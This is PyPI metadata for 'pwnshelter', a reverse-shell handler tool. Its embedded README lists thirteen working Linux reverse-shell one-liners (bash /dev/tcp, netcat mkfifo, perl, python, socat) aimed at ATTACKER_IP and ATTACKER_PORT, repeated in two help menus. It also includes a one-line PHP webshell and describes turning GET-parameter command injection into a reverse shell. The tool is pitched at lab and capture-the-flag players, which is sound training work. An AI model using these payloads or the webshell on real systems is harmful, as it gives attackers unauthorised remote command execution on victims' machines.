{
  "info": {
    "author": "Bides 'Xyan1d3' Das",
    "author_email": "blackviking.soapmactavish@gmail.com",
    "bugtrack_url": null,
    "classifiers": [
      "License :: OSI Approved :: Apache Software License",
      "Operating System :: POSIX :: Linux",
      "Programming Language :: Python :: 3"
    ],
    "description": "# Shelter\n***\n\nShelter the magical Shell Handler.\n![](img/Pasted_image_20210428200307.png)\n## What is it ?\n\nShelter is a new way to catch reverse shell's and also reduces the effort of visiting `pentestmonkey` and `highoncoffee`frequently for reverse shell payloads and changing of the `Attacker-IP` and `Attacker-Port` everytime.\n\nShelter is made to perform in 4 mode's. The required mode can be easily set by passing the argument of the mode to the script.\n- **rev** : Generates and copies reverse shell payload with `IP` and `port` set to clipboard and also starts up a netcat.\n- **web** : Webshell interactor for GET parameter command injection in php.\n- **webrev** : Convert's a classic GET parameter command injection in php to a reverse shell.\n- **host** : Will host post exploitation module's like `pspy`,`linpeas` etc. from the attackbox using `python http.server` or `updog` and copy the web url to the clipboard. \n\n**This tool is focused towards the solver's of `hackthebox`, `tryhackme` or any other labs with `vpn` connection.**\n\n***\n## ✨ Features\n### rev Module\n- Generate and copy revshell payload with `ATTACKERIP`[default: tun0] and `ATTACKERPORT`. \n- Start's Up a netcat listener on that port for catching the shell.\n- Support's `13` language's of reverse shell payload's all tested.\n**Only Linux payload's are supported for now.**\n- Reduces the hassle of visiting `pentestmonkey` or `highoncoffee` reverse shell cheatsheet for geting reverse shell payloads and changing the `IP` and `PORT` on it everytime.\n**This tools is not claiming to be better than pentestmonkey or highoncoffee by any means.**\n### web Module\n- Reduces the hassle of writting commands in `burpsuite` in time of php parameter command injection and url encoding every time.\n- Automatically, URL encodes the command before sending it.\n\n### webrev Module\n- Converts a dumb GET parameter command injection to a reverse shell.\n- Generates a reverse shell payload with set `ATTACKERIP`[default : tun0] and `ATTACKERPORT` and sends it to webserver url encoded.\n- Starts up a netcat listner on the given `ATTACKERPORT` for catching the shell.\n### host Module[Coming Soon...]\n- It will create a `www` directory with `phpreverseshell`, `powershell reverseshell`, while setting the `ATTACKERIP` and `ATTACKERPORT` and post exploitation tools like `pspy`,`linpeas`,`winpeas` etc. using `updog` or classic `python http.server`.\n- It will also copy the url of the file hosted from the server to the clipboard for easy pasting and `wgetting`\n***\n## Usage\n### Rev Module\n#### Help Menu\n```python\n┌─[root@Xyan1d3]─[/opt/github/shelter]\n└──╼ # ./shelter.py rev --help\nusage: shelter.py rev [-h] {bash,bashi,bash196,bashrl,bash5,bashudp,nc_mkfifo,perl,py2,py,py2export,pyexport,socat} ...\n\noptional arguments:\n  -h, --help            show this help message and exit\n\nAvailable Payloads:\n  {bash,bashi,bash196,bashrl,bash5,bashudp,nc_mkfifo,perl,py2,py,py2export,pyexport,socat}\n    bash                echo base64_encoded_bash-i_payload |base64 -d|bash\n    bashi               bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1\n    bash196             0<&196;exec 196<>/dev/tcp/ATTACKER_IP/ATTACKER_PORT; bash <&196 >&196 2>&196\n    bashrl              exec 5<>/dev/tcp/ATTACKER_IP/ATTACKER_PORT;cat <&5 | while read line; do $line 2>&5 >&5; done\n    bash5               bash -i 5<> /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0<&5 1>&5 2>&5\n    bashudp             bash -i >& /dev/udp/ATTACKER_IP/ATTACKER_PORT 0>&1\n    nc_mkfifo           rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc ATTACKER_IP ATTACKER_PORT >/tmp/f\n    perl                perl -e 'use Socket;$i=\"ATTACKER_IP\";$p=ATTACKER_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton\n                        ($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"bash -i\");};'\n    py2                 python -c 'import\n                        socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",ATTACKER_PORT));os.dup2(s.fileno(),0);\n                        os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'\n    py                  python3 -c 'import\n                        socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",ATTACKER_PORT));os.dup2(s.fileno(),0);\n                        os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'\n    py2export           export RHOST=\"ATTACKER_IP\";export RPORT=ATTACKER_PORT;python -c 'import\n                        sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in\n                        (0,1,2)];pty.spawn(\"bash\")'\n    pyexport            export RHOST=\"ATTACKER_IP\";export RPORT=ATTACKER_PORT;python3 -c 'import\n                        sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in\n                        (0,1,2)];pty.spawn(\"bash\")\n    socat               socat TCP:ATTACKER_IP:ATTACKER_PORT EXEC:'bash',pty,stderr,setsid,sigint,sane\n```\n```python\n┌─[root@Xyan1d3]─[/opt/github/shelter]\n└──╼ # ./shelter.py rev py --help\nusage: shelter.py rev py [-h] [--nohandler] [-i 127.0.0.1] [-p 8888]\n\noptional arguments:\n  -h, --help    show this help message and exit\n  --nohandler   Copies only the revshell payload. [Does not start handler]\n  -i 127.0.0.1  IP for reverse shell.\n  -p 8888       PORT for reverse shell.\n```\n\n#### Taking a reverse shell from a docker container.\n![](img/Pasted_image_20210428201310.png)\n\n### Web Module\n#### Help Menu\n```python\n┌─[root@Xyan1d3]─[/opt/github/shelter]\n└──╼ # ./shelter.py web --help\nusage: shelter.py web [-h] [-f F] [-param PARAM] [--ssl] [--nossl] URL\n\npositional arguments:\n  URL           Target URL [http://127.0.0.1/cmd.php]\n\noptional arguments:\n  -h, --help    show this help message and exit\n  -f F          Filename of the webshell [Default : cmd.php]. Incase you enter only ip in url arg.\n  -param PARAM  GET parameter to send commands.[Default: cmd]\n  --ssl         Force HTTPS\n  --nossl       Force downgrade to HTTP\n```\n\nBy default it assume's filename `cmd.php` and GET parameter `cmd` if not specified as an argument.\n\nThe php code responsible for getting a simple GET parameter webshell.\n```php\nroot@6a647b5a3d5f:~# cat cmd.php \n<?php system($_GET[cmd]); ?>\n```\n#### Webshell on a docker container.\n![](img/Pasted_image_20210428202006.png)\n\n### Webrev Module\n#### Help Menu\n```python\n┌─[root@Xyan1d3]─[/opt/github/shelter]\n└──╼ # ./shelter.py webrev --help                                                                                                                                        \nusage: shelter.py webrev [-h] [-f F] [-param PARAM] [--ssl] [--nossl] URL {bash,bashi,bash196,bashrl,bash5,bashudp,nc_mkfifo,perl,py2,py,py2export,pyexport,socat} ...\n\npositional arguments:                                                                                                                                                    \n  URL                   Target URL [http://127.0.0.1/cmd.php]                       \n\noptional arguments:                                                                 \n  -h, --help            show this help message and exit\n  -f F                  Filename of the webshell [Default : cmd.php]. Incase you enter only ip in url arg.\n  -param PARAM          GET parameter to send commands.[Default: cmd]                                                                                                    \n  --ssl                 Force HTTPS                                                 \n  --nossl               Force downgrade to HTTP\n\nAvailable Payloads:                                                                                                                                                      \n  {bash,bashi,bash196,bashrl,bash5,bashudp,nc_mkfifo,perl,py2,py,py2export,pyexport,socat}                                                                               \n    bash                echo base64_encoded_bash-i_payload |base64 -d|bash          \n    bashi               bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1                                                                                               \n    bash196             0<&196;exec 196<>/dev/tcp/ATTACKER_IP/ATTACKER_PORT; bash <&196 >&196 2>&196                                                                     \n    bashrl              exec 5<>/dev/tcp/ATTACKER_IP/ATTACKER_PORT;cat <&5 | while read line; do $line 2>&5 >&5; done                                                    \n    bash5               bash -i 5<> /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0<&5 1>&5 2>&5\n    bashudp             bash -i >& /dev/udp/ATTACKER_IP/ATTACKER_PORT 0>&1                                                                                               \n    nc_mkfifo           rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc ATTACKER_IP ATTACKER_PORT >/tmp/f                                                             \n    perl                perl -e 'use Socket;$i=\"ATTACKER_IP\";$p=ATTACKER_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton\n                        ($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"bash -i\");};'                                                              \n    py2                 python -c 'import                                                                                                                                \n                        socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",ATTACKER_PORT));os.dup2(s.fileno(),0);          \n                        os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'                                                                       \n    py                  python3 -c 'import                                          \n                        socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",ATTACKER_PORT));os.dup2(s.fileno(),0);          \n                        os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'                                                                       \n    py2export           export RHOST=\"ATTACKER_IP\";export RPORT=ATTACKER_PORT;python -c 'import\n                        sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in                    \n                        (0,1,2)];pty.spawn(\"bash\")'\n    pyexport            export RHOST=\"ATTACKER_IP\";export RPORT=ATTACKER_PORT;python3 -c 'import                                                                      \n                        sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in\n                        (0,1,2)];pty.spawn(\"bash\")\n    socat               socat TCP:ATTACKER_IP:ATTACKER_PORT EXEC:'bash',pty,stderr,setsid,sigint,sane\n```\n#### Revshell on a docker container.\n![](img/Pasted_image_20210428223306.png)\n\n***\n# Disclaimer\nDon't use this script for any malicious or illegal purpose's. The Author or any contributor of this repository or tool is not responsible for any of those activities.\n\n\n",
    "description_content_type": "text/markdown",
    "docs_url": null,
    "download_url": "",
    "downloads": {
      "last_day": -1,
      "last_month": -1,
      "last_week": -1
    },
    "home_page": "https://github.com/Xyan1d3/shelter",
    "keywords": "",
    "license": "",
    "maintainer": "",
    "maintainer_email": "",
    "name": "pwnshelter",
    "package_url": "https://pypi.org/project/pwnshelter/",
    "platform": "",
    "project_url": "https://pypi.org/project/pwnshelter/",
    "project_urls": {
      "Bug Tracker": "https://github.com/Xyan1d3/shelter/issues",
      "Homepage": "https://github.com/Xyan1d3/shelter"
    },
    "release_url": "https://pypi.org/project/pwnshelter/2.0.1/",
    "requires_dist": [
      "argparse (>=1.2)",
      "pyperclip (>=1.6.0)",
      "netifaces (>=0.10.8)",
      "requests (>=2.25.1)"
    ],
    "requires_python": ">=3.6",
    "summary": "Reverse Shell Payload Handler",
    "version": "2.0.1",
    "yanked": false,
    "yanked_reason": null
  },
  "last_serial": 10627390,
  "releases": {
    "2.0.1": [
      {
        "comment_text": "",
        "digests": {
          "blake2b_256": "585617069b5f60e9198453e608468c16746b9aa94d7d8ac3aac45e0d520fa359",
          "md5": "150cfa4fdfa9401c183948df4e854d40",
          "sha256": "80dccce5a944cf26bfdaf15f9035c89d2f53334d506b3a8c427d4279bf6b4b36"
        },
        "downloads": -1,
        "filename": "pwnshelter-2.0.1-py3-none-any.whl",
        "has_sig": false,
        "md5_digest": "150cfa4fdfa9401c183948df4e854d40",
        "packagetype": "bdist_wheel",
        "python_version": "py3",
        "requires_python": ">=3.6",
        "size": 16151,
        "upload_time": "2021-06-11T21:05:53",
        "upload_time_iso_8601": "2021-06-11T21:05:53.876680Z",
        "url": "https://files.pythonhosted.org/packages/58/56/17069b5f60e9198453e608468c16746b9aa94d7d8ac3aac45e0d520fa359/pwnshelter-2.0.1-py3-none-any.whl",
        "yanked": false,
        "yanked_reason": null
      },
      {
        "comment_text": "",
        "digests": {
          "blake2b_256": "4211ff71a54666f9291661b8859294776b747fff9a2ca0461af6d3e9a859c8c5",
          "md5": "e80753c4d3ced10d54cccf8e766dd3aa",
          "sha256": "96441ba9ff43911078bfb07d7b8257d3878ff13cdd70d74814ee2c568f480bb6"
        },
        "downloads": -1,
        "filename": "pwnshelter-2.0.1.tar.gz",
        "has_sig": false,
        "md5_digest": "e80753c4d3ced10d54cccf8e766dd3aa",
        "packagetype": "sdist",
        "python_version": "source",
        "requires_python": ">=3.6",
        "size": 13722,
        "upload_time": "2021-06-11T21:05:55",
        "upload_time_iso_8601": "2021-06-11T21:05:55.364049Z",
        "url": "https://files.pythonhosted.org/packages/42/11/ff71a54666f9291661b8859294776b747fff9a2ca0461af6d3e9a859c8c5/pwnshelter-2.0.1.tar.gz",
        "yanked": false,
        "yanked_reason": null
      }
    ]
  },
  "urls": [
    {
      "comment_text": "",
      "digests": {
        "blake2b_256": "585617069b5f60e9198453e608468c16746b9aa94d7d8ac3aac45e0d520fa359",
        "md5": "150cfa4fdfa9401c183948df4e854d40",
        "sha256": "80dccce5a944cf26bfdaf15f9035c89d2f53334d506b3a8c427d4279bf6b4b36"
      },
      "downloads": -1,
      "filename": "pwnshelter-2.0.1-py3-none-any.whl",
      "has_sig": false,
      "md5_digest": "150cfa4fdfa9401c183948df4e854d40",
      "packagetype": "bdist_wheel",
      "python_version": "py3",
      "requires_python": ">=3.6",
      "size": 16151,
      "upload_time": "2021-06-11T21:05:53",
      "upload_time_iso_8601": "2021-06-11T21:05:53.876680Z",
      "url": "https://files.pythonhosted.org/packages/58/56/17069b5f60e9198453e608468c16746b9aa94d7d8ac3aac45e0d520fa359/pwnshelter-2.0.1-py3-none-any.whl",
      "yanked": false,
      "yanked_reason": null
    },
    {
      "comment_text": "",
      "digests": {
        "blake2b_256": "4211ff71a54666f9291661b8859294776b747fff9a2ca0461af6d3e9a859c8c5",
        "md5": "e80753c4d3ced10d54cccf8e766dd3aa",
        "sha256": "96441ba9ff43911078bfb07d7b8257d3878ff13cdd70d74814ee2c568f480bb6"
      },
      "downloads": -1,
      "filename": "pwnshelter-2.0.1.tar.gz",
      "has_sig": false,
      "md5_digest": "e80753c4d3ced10d54cccf8e766dd3aa",
      "packagetype": "sdist",
      "python_version": "source",
      "requires_python": ">=3.6",
      "size": 13722,
      "upload_time": "2021-06-11T21:05:55",
      "upload_time_iso_8601": "2021-06-11T21:05:55.364049Z",
      "url": "https://files.pythonhosted.org/packages/42/11/ff71a54666f9291661b8859294776b747fff9a2ca0461af6d3e9a859c8c5/pwnshelter-2.0.1.tar.gz",
      "yanked": false,
      "yanked_reason": null
    }
  ],
  "vulnerabilities": []
}